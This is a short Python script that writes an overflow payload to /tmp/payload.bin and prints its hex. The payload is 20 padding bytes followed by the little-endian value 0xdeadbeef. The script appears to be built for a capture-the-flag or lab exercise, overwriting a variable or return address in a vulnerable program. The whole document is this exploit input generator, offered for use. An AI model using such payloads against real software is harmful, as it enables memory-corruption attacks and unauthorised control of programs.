#!/usr/bin/env python3

pad = b'B' * 20
val_bytes = b'\xef\xbe\xad\xde'  

payload = pad + val_bytes

with open('/tmp/payload.bin', 'wb') as f:
    f.write(payload)

print("Wrote /tmp/payload.bin  length =", len(payload))
print("Hex payload :", payload.hex())
